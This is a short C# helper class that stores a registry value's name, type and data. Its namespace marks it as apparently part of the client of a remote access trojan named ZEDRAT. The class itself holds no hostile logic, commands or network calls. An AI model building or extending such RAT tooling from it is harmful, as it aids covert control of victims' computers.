using Microsoft.Win32;

namespace Client.ZEDRAT.Helper
{
	public class RegValueData
	{
		public string Name { get; set; }

		public RegistryValueKind Kind { get; set; }

		public object Data { get; set; }

		public RegValueData(string name, RegistryValueKind kind, object data)
		{
			this.Name = name;
			this.Kind = kind;
			this.Data = data;
		}

		public override string ToString()
		{
			return $"({this.Name}:{this.Kind}:{this.Data})";
		}
	}
}
